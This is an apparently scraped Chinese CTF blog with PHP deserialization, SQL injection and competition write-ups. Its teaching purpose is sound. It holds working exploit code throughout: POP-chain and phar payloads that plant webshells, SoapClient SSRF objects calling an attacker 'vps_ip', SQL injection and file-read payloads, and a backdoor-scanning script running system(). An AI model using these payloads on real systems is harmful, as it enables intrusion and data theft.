$this-&gt;$k = null; &#125; echo \"Waking up\\n\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; $this-&gt;token = &amp;$this-&gt;token_flag; &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag)&#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125;&#125;$h = new Handle(new Flag('flag.php'));echo urlencode(serialize($h));//$c = \"O:6:\\\"Handle\\\":3:&#123;s:14:\\\"Handlehandle\\\";O:4:\\\"Flag\\\":3:&#123;s:4:\\\"file\\\";s:8:\\\"flag.php\\\";s:5:\\\"token\\\";N;s:10:\\\"token_flag\\\";R:4;&#125;&#125;\"; session序列化漏洞简单介绍12345&lt;?phpsession_start();$_SESSION['login'] = true;$_SESSION['id'] = 1;$_SESSION['username'] = 'Ariel'; session的数据会存储在/var/lib/php/sessions/目录下，读一下这个目录的内容可以看到，这个序列化后的值跟我们最上面的值很相似，但是又有点不同，因为在session的序列化中有三种不同的引擎，他们序列化后的结果都是不一样的php_binary：ascii字符+键名+serialize()函数处理后的值php：键名+竖线+serialize()函数处理后的值php_serialize：serialize()函数处理后的值如果没有指定引擎的时候，默认使用的是php引擎，但是如果我们指定了引擎的话，就会根据我们指定的去进行序列化下面让我们看一下不同的引擎出来的不同的值123456&lt;?phpini_set('session.serialize_handler','php_binary');session_start();$_SESSION['login'] = true;$_SESSION['id'] = 1;$_SESSION['username'] = 'Ariel'; 可以看到这里有个正方形，login的长度是5，ascii字符是ENQ，不可见，所以显示不出来，剩下的部分还是按照之前的规则去存储的接下来是php_serialize123456&lt;?phpini_set('session.serialize_handler','php_serialize');session_start();$_SESSION['login'] = true;$_SESSION['id'] = 1;$_SESSION['username'] = 'Ariel'; 可以看到存储的值也发生了变化，那么问题来了，如果我们存储和解密session的时候用的引擎不一样，会不会引发问题呢？ 例题下面放一题Jarvis OJ的题目1http://web.jarvisoj.com:32784/ 进去先看到源码12345678910111213141516171819202122232425 &lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125; 可以看到这里有个后门eval，但是我们想要执行却发现类在构造的时候就已经对mdzz赋值了，有什么办法能控制它的值呢？我们先看一下他的phpinfo有没有什么信息好吧可以看到他开启了session.upload_progress.enabled，因此我们可以控制文件内容，所以现在我们要做的就是写exp了首先是对exal函数的利用，因为引擎不同，我们只需要在反序列化后的值前面加个|就可以让他成功触发漏洞了123456789101112131415161718192021&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'print_r(dirname(__FILE__));'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;$o = new OowoO();echo serialize($o);//print_r(dirname(__FILE__));//print_r(scandir(\"/opt/lampp/htdocs\"));//print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\")); 这个时候我们要做的就是控制session的值了，根据官方的文档可以写出如下脚本1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;session反序列化&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=\"http://web.jarvisoj.com:32784/index.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /&gt; &lt;input type=\"file\" name=\"changehere\" /&gt; &lt;input type=\"submit\" value=\"go\" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 接下来要做的就是抓包修改值，触发反序列化，具体看图吧 phar反序列化简单介绍首先介绍一下phar://，phar://和php://filter、data://协议那些一样，都是流包装，可以将一组php文件进行打包，可以创建默认执行的stub，而stub就是一个标志，他的格式是xxx&lt;?php xxxxx;__HALT_COMPILER();?&gt;，结尾是__HALT_COMPILER()&#39;?&gt;，不然phar识别不了phar文件 简单栗子我们首先先看一下phar怎么用1234567891011&lt;?phpclass TestObject&#123;&#125;$phar = new Phar(\"phar.phar\");$phar -&gt; startBuffering();$phar -&gt; setStub(\"&lt;?php __HALT_COMPILER();?&gt;\");$o = new TestObject();$o -&gt; data = 'h4ck3r';$phar -&gt; setMetadata($o);$phar -&gt; addFromString(\"test.txt\",\"test\");$phar -&gt; stopBuffering(); 执行一下我们看到他会产生一个phar.phar文件，丢去二进制编辑器看一下我们确实看到了有反序列化后的值，对应的，就有反序列化的操作，而php大部分文件系统函数在通过phar://协议解析的时候，都会将meta-data进行反序列化，影响函数如下接下来我们进行反序列化1234567&lt;?phpclass TestObject&#123; function __destruct()&#123; echo $this-&gt;data; &#125;&#125;include ('phar://phar.phar'); 可以看到确实是有数据输出，因此可以看到这样是可以触发反序列化漏洞了，接下来就是利用了 例题这里我们先给一个很简陋很简陋的前端的上传框好吧12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;ea3y_upload_file&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=\"http://localhost/ctf/serialize/train/phar_title1.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" name=\"upload\" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 后台的限制是123456789101112131415161718192021&lt;?phpif (($_FILES[\"file\"][\"type\"]==\"image/gif\")&amp;&amp;(substr($_FILES[\"file\"][\"name\"], strrpos($_FILES[\"file\"][\"name\"], '.')+1))== 'gif') &#123; echo \"Upload: \" . $_FILES[\"file\"][\"name\"].\"&lt;br&gt;\"; echo \"Type: \" . $_FILES[\"file\"][\"type\"].\"&lt;br&gt;\"; echo \"Temp file: \" . $_FILES[\"file\"][\"tmp_name\"].\"&lt;br&gt;\"; if (file_exists(\"upload_file/\" . $_FILES[\"file\"][\"name\"])) &#123; echo $_FILES[\"file\"][\"name\"] . \" already exists. \"; &#125; else &#123; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload_file/\" .$_FILES[\"file\"][\"name\"]); echo \"Stored in: \" . \"upload_file/\" . $_FILES[\"file\"][\"name\"]; &#125;&#125;else&#123; echo \"Invalid file,you can only upload gif\";&#125; 可以看到后台只允许上传gif文件，再接着看一下后台处理文件的源码123456789&lt;?php$filename=$_GET['filename'];class AnyClass&#123; function __destruct() &#123; eval($this -&gt;data); &#125;&#125;include ($filename); 可以看到后台拿到文件名会include进去文件名，而且还有一个类的__destruct方法里面有个eval函数，所以现在问题来了，我们要怎么利用呢？但是我们可以利用phar协议去完成利用，先写下exp123456789101112131415&lt;?phpclass AnyClass&#123; function __destruct() &#123; eval($this -&gt; data); &#125;&#125;$phar = new Phar('phar2.phar');$phar -&gt; stopBuffering();$phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;');$phar -&gt; addFromString('test.txt','test');$object = new AnyClass();$object -&gt; data = 'phpinfo();';$phar -&gt; setMetadata($object);$phar -&gt; stopBuffering(); 然后就是先更改phar2.phar，将他的后缀名改成gif去上传上去，成功上传以后可以进行利用了可以看到成功利用了，这就是一个简单的例子，深入的就在以后的比赛题中慢慢体会吧 原生类序列化问题接下来的一个问题就是涉及到原生类的序列化问题了，首先我们先了解什么是原生类 原生类同名函数首先先认识原生类同名函数的攻击漏洞，先假设我们有一个上传类如下123456789&lt;?phpclass Upload&#123; function upload($filename, $content)&#123; //这是一个你不能修改的文件, prprprpr &#125; function open($filename, $content)&#123; //你还是不能修改, lololololol &#125;&#125; 这个上传类被.htaccess文件控制的很死，难以上传我们的小马，即使成功上传了，也不能执行，只有删除了.htaccess文件才可以，那么我们要怎么利用呢所以我们现在就是要先找到一个函数，能删除或者覆盖掉.htaccess文件，先搜索一波12345678&lt;?phpforeach (get_declared_classes() as $class)&#123; foreach (get_class_methods($class) as $method)&#123; if ($method == \"open\")&#123; echo \"$class -&gt; $method\".\"&lt;br&gt;\"; &#125; &#125;&#125; 这里搜索到三个函数123SessionHandler -&gt; openZipArchive -&gt; openXMLReader -&gt; open 接下来就是查阅官方手册看一下哪个能利用 搜索可利用函数先看SessionHandler::open查看参数可知，他的传参只有两个，save_path和session_name，都是关于session方面的操作的，难以利用接着找ZipArchive::open可以看到flag参数有个ZipArchive::OVERWRITE模式，继续找它的官方介绍能看到12ZIPARCHIVE::OVERWRITE (integer)总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖。 我们先测试一下可以看到确实成功的删除了文件，因此我们就可以达到了删除固定文件的目的，也就摆脱了.htaccess文件的限制了最后再看一下XMLReader::open里面的几个option都没有删除文件的功能，利用价值不高 例题这部分晚点再补充 原生类魔幻函数上面的函数固然可以成功利用，但是要找到这样的函数并非一件简单的事情，因此我们可以考虑一下，有没有什么类里面会包含了魔幻函数呢，这样子我们利用的难度也会大大降低 找可利用的类改一下原来的搜索脚本1234567891011121314151617181920212223&lt;?php$classes = get_declared_classes();foreach ($classes as $class)&#123; $methods = get_class_methods($class); foreach ($methods as $method)&#123; if (in_array($method, array( '__construct', '__destruct', '__toString', '__wakeup', '__call', '__callStatic', '__get', '__set', '__isset', '__unset', '__invoke', '__set_state' )))&#123; echo $class.\"::\".$method.\"&lt;br&gt;\"; &#125; &#125;&#125; 可以看到确实能找出一堆的函数 例题上面列了这么多函数，但是具体如何利用呢，下面放一道题目，就是2018LCTF的一道题目，index.php的源码为1234567891011&lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET['f'],$_POST);session_start();if(isset($_GET['name']))&#123; $_SESSION['name'] = $_GET['name'];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),'welcome_to_the_lctf2018');call_user_func($b,$a); flag.php的源码为1234567&lt;?phpsession_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;******************&#125;';if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\")&#123;$_SESSION['flag'] = $flag;&#125; 这题可以看到index.php里面有个call_user_func函数，理想状态下我们是想通过变量覆盖，将$b覆盖成unserialize，然后利用下一个call_user_func函数再去调用进行利用，可是$a是数组，难以进行利用，根据题目给出的flag.php文件可以猜测到时利用反序列化去触发ssrf，所以现在我们就是要去寻找一个可以利用的类这题的利用点有两个，一个是session类，另一个就是SOAP类了，根据我们上面讲的可以知道，我们现在要做的就是利用session引擎的漏洞和原生类的魔幻函数去进行反序列化漏洞利用了我们先试一下最简单的用法去进行反弹shell123456&lt;?php$a = new SoapClient(null,array('location'=&gt;'http://vps_ip:2333','uri'=&gt;'123'));$b = serialize($a);echo $b;$c = unserialize($b);$c -&gt; a(); 成功回弹，那么接下来就是要试一下能不能进行crlf1234567891011121314&lt;?php$target = \"http://vps_ip:2333\";$post_string = 'data=abc';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=3stu05dr969ogmpr1954456893');$b = new SoapClient(null,array('location' =&gt; $target,'user_agent' =&gt; 'glarcy^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string,'uri'=&gt;'hello'));$aaa = serialize($b);$aaa = str_replace('^^',\"\\n\\r\",$aaa);echo urlencode($aaa);//echo $b;$d = unserialize($aaa);$d -&gt; b(); 尝试了利用以后，就回到题目做题了，这道题目我们先用call_user_func去设置session引擎，然后再利用默认的引擎去触发反序列化，exp如下12345&lt;?php$target = 'http://127.0.0.1/ctf/soap/flag.php';$attack = new SoapClient(null,array('location'=&gt;$target,'user_agent'=&gt;\"glary\\r\\nCookie: PHPSESSID=8nsujaq7o5tl0btee8urnlsrb3\\r\\n\",'uri'=&gt;'123'));$payload = urlencode(serialize($attack));echo $payload; 生成payload打过去，但是要记得在payload前加一个|，因为我们是要先利用session的反序列化漏洞将payload存进session然后就是去修改利用extract进行覆盖来反序列化利用了，注意session的值要记得改菜鸡水平有限，php的反序列化部分暂时先讲到这里，有错误希望各位大师傅指出Orz","comments":true,"permalink":"https://xi4or0uji.github.io/2019/06/27/php反序列化由浅到深/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"serialize","slug":"serialize","permalink":"https://xi4or0uji.github.io/tags/serialize/"}]},{"title":"SQL注入汇总","date":"2019-06-24T16:00:00.000Z","path":"2019/06/25/SQL注入汇总/","text":"最近要做一个萌新培训&amp;搭建队内的wiki，所有就有了这个东西了，尽可能将sql注入讲全，同时也记录一下奇技淫巧2333 回显注入这种题是最友好的题了，萌新入门题，先来个对mysql数据库最初的印象好吧 例题http://ctf5.shiyanbar.com/423/web/?id=1做题前先来一个注入点的探测好吧先尝试一下最基础的很明显可以确定id是注入点而且后台是用单引号闭合的可以看到回显是1 1=1，这里我们猜测一下，如果后台过滤了空格，而且将and替换为空刚好是这样的回显的，然后空格被过滤掉以后是可以用/**/或者(去进行替换的，尝试一下验证一下我们的猜想可以看到替换了以后空格可以执行了，而且and也显示出来了，或许后台没有过滤and？先继续下一步去探测通过这个语句爆出了数据库名，接着找表名接下来找字段名因为对column_name和information_schema.columns进行了过滤，我们可以用双写绕过拿到字段名和表名最后就是读内容了这道题的绕过还是很友好的，只是一些双写的绕过和空格的绕过而已，那么接下来我们再来一个难一点的 报错注入有时候，如果过滤不严但是页面没有什么回显点的时候，可以考虑一下报错注入，常见报错分为数据溢出、xpath语法错误、主键重复和一些神奇的特性 数据溢出首先就是最基础也最好懂的数据溢出，我们先看一下mysql的数据范围这里需要注意一点的就是，整数出现溢出以后会报错的情况在mysql5.5+才会有，不然是不会进行报错的，当然，我们在做溢出的时候也不用看着上面的数据范围去选择数据进行溢出，只需要用一个小的数进行按位取反就行当然这里重点是要讲利用函数进行溢出和利用，先一个个函数讲过去 exp这个函数是用来返回e(自然对数的底)到X次方的值此函数返回e(自然对数的底)的X次方的值，但是如果超出范围是会报错的而我们知道字母的值是很小的，好像是0？没记错的话，这个时候如果取个反而且exp一下的话，肯定是会超出范围的注意一个坑点，当mysql版本&lt;=5.5.4的时候可以将报错信息显示出来，也就是会显示成123MariaDB [(none)]&gt; select exp(~(select user()));ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~(&apos;root@localhost&apos;))&apos;MariaDB [(none)]&gt; 可是mysql&gt;5.5.4的时候就只报错不显示信息了，而且报错信息有长度显示，不能超过512 xpath语法错误在mysql中，提供了一些xml查询和修改的函数，比如extractvalue和updatexml，但是利用他的时候要符合xpath的语法，如果不符合则会将报错信息输出出来，因此如果我们在里面进行数据库查询的时候，他也会相应的爆出来至于例题，bugku有一题多次的注入，第二关就是报错注入 主键重复这里利用了count和group by在遇到rand产生的重复值时报错，错误类型是duplicate entry，即主键重复。实际上只要是count，rand，group by三个连用就会造成这种报错，与位置无关。这种报错方式的本质是因为floor(rand(0)*2)的重复性，导致了group by语句的出错，group by key的原理是循环读取数据的每一行，将结果保存在一个临时的表中。读取每一行的key时，如果key存在于临时表时，就不更新临时表的数据，否则就插入数据。 举个栗子假设我们现在有这样一张表但是如果我们有这样一句语句select count(*) from user group by username，他的过程是这样的先是建立一个类似这样的虚拟表然后建立过程是正常操作是不会有问题的，但是如果rand(0)*2，就会报错了，因为rand(0)是一个稳定的序列可以看到，两次随机出来的东西居然是一样的，因此取整的时候自然也一样了这个时候如果我们将刚刚的语句改成select count(*) from user group by floor(rand(0)*2)先注意一点，MySQL官方：查询的时候如果使用rand()的话，该值会被计算多次，在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，最终会导致主键重复错误产生。继续是建立一个虚拟的表先取第一条数据，执行floor(rand(0)*2)（第一次计算），结果是0，但是虚表没有该键值，故再进行一次计算（第二次计算），结果是1，然后插入数据取第二条数据的时候，再进行一次计算（第三次计算），结果是1，所以更新表格到了取第三条数据的时候，进行一次计算（第四次计算），结果是0，但是键值没有0，所以再一次计算（第五次计算），但是这个时候出来的结果是1，此时1已经存在在表格里了，所以就会出现主键重复了还要注意一点1RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. 大概的意思就是：在where语句中，where每执行一次，rand()函数就会被计算一次。rand()不能作为order by的条件字段，同理也不能作为group by的条件字段。12345678//数据库select * from user where 1=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a);//表名select * from user where 1=1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);//字段select * from user where 1=1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name='user' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);//值select * from user where 1=1 and (select 1 from (select count(*),concat((select id from user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); 神奇的特性这里写的我也不知道归去什么，就放去特性好了 列名重复在mysql中，列名重复的时候会报错，利用这一个特性，配合上join的使用，我们也可以将字段爆出来1234mysql&gt; select * from (select * from user a join user b)c;ERROR 1060 (42S21): Duplicate column name &apos;id&apos;mysql&gt; select * from (select * from user a join user b using(id))c;ERROR 1060 (42S21): Duplicate column name &apos;username&apos; 几何函数在mysql中有一些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()等，如果我们传入的参数不是几何数据就会报错，但是mysql版本5.7及以上的时候就只报错不报信息1select multipoint((select * from (select * from (select version())a)b)); 盲注布尔盲注时间盲注报错盲注一些神奇的技巧宽字节注入like注入继续是之前的数据库，我们先看一下like是怎么用的1234567MariaDB [door]&gt; select * from user where username like &apos;%us%&apos;;+----+----------+| id | username |+----+----------+| 1 | user |+----+----------+1 row in set (0.11 sec) 一般网站在进行搜索的时候，都会将要搜索的字符放进两个%中间，所以如果我们的输入的数据不是正常的数据，而是类似于万能钥匙的东西，那样就存在注入了123456789101112MariaDB [door]&gt; select * from user where username like &apos;%&apos; and 1=1 and &apos;%&apos;=&apos;%&apos;;+----+----------+| id | username |+----+----------+| 1 | user || 2 | admin || 3 | Ariel || 4 | glarcy || 5 | Ariel || 6 | Twings |+----+----------+6 rows in set (0.28 sec) 记几句语句123&apos; and 1=1 and &apos;%&apos;=&apos;&apos; and 1=1--&apos;1&apos;or(select(password)from(user)like/**/&apos;%a%&apos;)# 异或注入用于布尔盲注的一种，同号为假异号为真11^(length(select database())=5)%23 innodb引擎的注入如果mysql的用户是root，mysql版本在5.6以上，information那些关键字又过滤了，可以考虑下这个注入123456789101112131415161718192021mysql&gt; select @@innodb_version;+------------------+| @@innodb_version |+------------------+| 5.6.36-82.2 |+------------------+1 row in set (0.00 sec)mysql&gt; select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();+--------------------------+| group_concat(table_name) |+--------------------------+| exercise,feedback,user |+--------------------------+1 row in set (0.00 sec)mysql&gt; select group_concat(table_name) from mysql.innodb_index_stats where database_name=database();+----------------------------------------------------------------------+| group_concat(table_name) |+----------------------------------------------------------------------+| exercise,exercise,exercise,feedback,feedback,feedback,user,user,user |+----------------------------------------------------------------------+1 row in set (0.00 sec) 但是有个鸡肋的地方就是不能报字段名 无列名注入这个是在你知道了字段有多少个，而且还知道数据库名是什么但是死活爆不出字段名的时候可以用1234567891011121314151617181920212223242526MariaDB [door]&gt; select 1,2 union select * from user;+---+--------+| 1 | 2 |+---+--------+| 1 | 2 || 1 | user || 2 | admin || 3 | Ariel || 4 | glarcy || 5 | Ariel || 6 | Twings |+---+--------+7 rows in set (0.00 sec)MariaDB [door]&gt; select `2` from (select 1,2 union select * from user)a;+--------+| 2 |+--------+| 2 || user || admin || Ariel || glarcy || Ariel || Twings |+--------+7 rows in set (0.00 sec) 约束攻击要求mysql版本5.5以上且设置数据库为宽松模式，避免出现error主要操作就是先注册一个账号为admin+n个空格+1，密码任意，然后登录的时候输入admin和你刚刚注册的密码原来就是mysql在select的时候比较不同长度的字符串时会用空格填充然后在进行比较，而insert的时候则会截断超过长度的字符串 通过SQL注入读取文件这个菜鸡踩了个大坑，之前线下赛考点这个点，但是用得少，死活记不起来，暴毙……123456MariaDB [door]&gt; select load_file(&apos;D:/1.txt&apos;);+-----------------------+| load_file(&apos;D:/1.txt&apos;) |+-----------------------+| u see me |+-----------------------+ 顺便拍个当时半决赛的题解12345678910111213141516# -*-coding:utf-8 -*-import requestsimport stringurl = \"http://172.29.3.104/index.php\"chars = string.ascii_letters + string.digits + \"&#123;&#125;\"flag = \"\"while 1: for x in chars: payload = \"username='or(load_file('/flag')like/**/binary/**/'\" + flag + x + \"%')#\" data = &#123; \"username\": payload &#125; if \"login success\" in requests.post(url, data=data).content: flag += x print flag 通过SQL注入写文件需要有写权限才行，局限很大，但是也记一下1234567891011MariaDB [door]&gt; select 1 into outfile &apos;D:/1.txt&apos;;ERROR 1086 (HY000): File &apos;D:/1.txt&apos; already existsMariaDB [door]&gt; select 1 into outfile &apos;D:/2.txt&apos;;Query OK, 1 row affected (0.00 sec)MariaDB [door]&gt; select load_file(&apos;D:/2.txt&apos;);+-----------------------+| load_file(&apos;D:/2.txt&apos;) |+-----------------------+| 1 |+-----------------------+1 row in set (0.28 sec)","comments":true,"permalink":"https://xi4or0uji.github.io/2019/06/25/SQL注入汇总/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://xi4or0uji.github.io/tags/SQL/"}]},{"title":"2019强网杯wp","date":"2019-05-26T16:00:00.000Z","path":"2019/05/27/2019强网杯wp/","text":"本来应该早一点就写好博客的，但是最近几个大作业压着，菜鸡累了，于是拖拖拖（捂脸 WEBupload这个网站进去登录注册以后就是一个上传图片的地方，经过一堆测试，发现只能上传图片，而且他会将文件名直接md5加密，然后再加上png后缀，所以想直接上个图片马是不行的了，接下来就是扫泄露扫出了www.tar.gz，所以就是愉快的源码分析了先看index.php，里面有个check_login函数，可以看到里面有个反序列化，而且发序列化的内容是cookie里的user值123456789101112public function login_check()&#123; $profile=cookie('user'); if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); $this-&gt;profile_db=db('user')-&gt;where(\"ID\",intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123; return 1; &#125;else&#123; return 0; &#125; &#125; &#125; 再继续审计，可以看到profile.php里面有个upload_img函数和__call函数1234567891011121314151617181920212223242526272829303132public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).\".png\"; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=\"../upload/$this-&gt;upload_menu/$this-&gt;filename\"; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error('Forbidden type!', url('../index')); &#125; &#125;else&#123; $this-&gt;error('Unknow file type!', url('../index')); &#125;&#125;public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; 可以看到upload_img函数里面有个copy函数，如果我们能对其filename和filename_tmp参数进行控制，那么我们就可以复制任意文件过去了，接下来就是想办法怎么控制里面的参数了继续进行审计，可以看见__call函数如果我们可以控制name这个参数，我们就有可能调用过去upload_img这个函数了那么怎么触发它呢，在register.php里面，有个__destruct的方法123456public function __destruct()&#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125;&#125; 而register类里面是没有index方法的，所以，我们就能让他触发过去__call，然后想办法控制参数，让他触发upload_img函数，所以pop链就是__destruct --&gt; __call --&gt; upload_img，最后payload如下123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpnamespace app\\web\\controller&#123; class Profile&#123; public $checker; public $index; public $filename_tmp; public $filename; public $ext; public function __construct() &#123; $this-&gt;index = \"Ariel\"; $this-&gt;checker = 0; $this-&gt;filename_tmp = \"upload/8b26631219c8f8ecac51b935cc87ccd1/f1f7f21e6c1bee52fad6244963831464.png\"; $this-&gt;filename = \"upload/8b26631219c8f8ecac51b935cc87ccd1/Ariel.php\"; $this-&gt;Ariel = \"upload_img\"; $this-&gt;ext = 1; &#125; public function __destruct() &#123; echo \"\\nok\"; &#125; &#125; class Register&#123; public $checker; public $registed; public function __construct($name) &#123; $this-&gt;registed = 0; $this-&gt;checker = $name; &#125; &#125; $p = new Profile(); $r = new Register($p); $payload = array(\"ID\" =&gt; 1, \"payload\" =&gt; $r); $payload = base64_encode(serialize($payload)); echo $payload . \"\\n\";&#125; 先上传一张内容为小马的图片，注意加个图片头，然后将生成的payload替换到cookie里，就可以成功触发反序列化，生成我们想要的文件接着就能愉快地执行任意命令了 强网先锋–上单这道题一进去就给了一个框架的目录，发现能读的东西还很多，读一下log日志，能读到一句payload，还很熟悉，了解过的都能一下看出来是tp5任意命令执行的漏洞的payload，拿出来直接利用就能拿到flag了 高明的黑客这个进去能下下来一个压缩包，打开看见有3000多个文件，里面一堆的命令执行函数，但是前面又有一些将获得的变量置空的语句，大胆猜测，这中间有一个是真的小马，所以我们现在就是要将他找出来1234567891011121314151617181920import reimport osimport timeimport requestsfor i in os.listdir('F:\\\\hacker\\\\'): with open('F:\\\\hacker\\\\'+i,'r') as f: try: data=f.read() m=re.findall(r'\\$_GET\\[[\\'\"]?(.*?)[\\'\"?]\\]', data) # print(i) for k in m: r=requests.get(url=\"http://ip/hacker/\"+i+\"/?\"+k+\"=system('cat /var/www/html/ctf/hacker/flag.txt');\") print \"http://ip/hacker/\"+i+\"/?\"+k+\"=system('cat /var/www/html/ctf/hacker/flag.txt');\" if 'Ariel' in r.text: print \"[+]find!\" print i + \" \" + k os._exit(0) except Exception as e: print(e) 找出来可利用的文件就能拿到flag了 随便注过滤了常用的字符，但是1&#39; or 1=1#可以拿到当前数据表的所有数据，而且还能进行堆叠注入1http://119.3.203.228:32420?inject=1'; show databases; 1http://119.3.203.228:32420?inject=1'; show tables; 1http://119.3.203.228:32420?inject=1'; use supersqli; show columns from `1919810931114514`;# 接下来这里有个坑点，这个时候如果直接rename数据表再利用原来的select去读flag是不行的，因为少了id列，但是加了id这个字段还是在报错，只能写在一起执行才可以1http://119.3.203.228:32420?inject=1';rename table `words`to flag;rename table `1919810931114514`to words;alter table words add column id varchar(30);%23 这个时候就可以利用1&#39; or 1=1#读到flag了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/05/27/2019强网杯wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019 RCTF wp","date":"2019-05-21T02:31:48.038Z","path":"2019/05/21/2019-RCTF-wp/","text":"这场神仙比赛菜鸡只能输出一些水题，趁着环境没关复现一下 WEBnextphp题目进去就给一句话木马123456 &lt;?phpif (isset($_GET['a'])) &#123; eval($_GET['a']);&#125; else &#123; show_source(__FILE__);&#125; 看下phpinfo不知道为什么php版本号有个-dev，open_basedir只有/var/www/html/，看了下有个preload.php文件，读一下12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpfinal class A implements Serializable &#123; protected $data = [ 'ret' = null, 'func' =&gt; 'print_r', 'arg' =&gt; '1' ]; private function run () &#123; $this-&gt;data['ret'] = $this-&gt;data['func']($this-&gt;data['arg']); &#125; public function __serialize(): array &#123; return $this-&gt;data; &#125; public function __unserialize(array $data) &#123; array_merge($this-&gt;data, $data); $this-&gt;run(); &#125; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125; public function __get ($key) &#123; return $this-&gt;data[$key]; &#125; public function __set ($key, $value) &#123; throw new \\Exception('No implemented'); &#125; public function __construct () &#123; throw new \\Exception('No implemented'); &#125;&#125; 而且还开了preload到了这里没思路了，谷歌一下文件名，没见过preload是什么呢，https://wiki.php.net/rfc/preload ，看到有句这样的话1In conjunction with ext/FFI (dangerous extension), we may allow FFI functionality only in preloaded PHP files, but not in regular ones FFI危险？看一下有没有开再去看一下FFI是什么，https://www.php.net/manual/zh/ffi.examples-basic.php ，emmm，一个可以插入原始C代码且执行的函数，https://www.php.net/manual/en/ffi.examples-callback.php现在我们可以写payload12345678910111213141516class A implements Serializable&#123; protected $data = [ 'ret' =&gt; null, 'func' =&gt; 'FFI::cdef', 'arg' =&gt; 'int system(const char *cmd);' ]; public function serialize():string&#123; return serialize($this-&gt;data); &#125; public function unserialize($payload)&#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125;&#125;$a = new A();echo urlencode(serialize($a)); 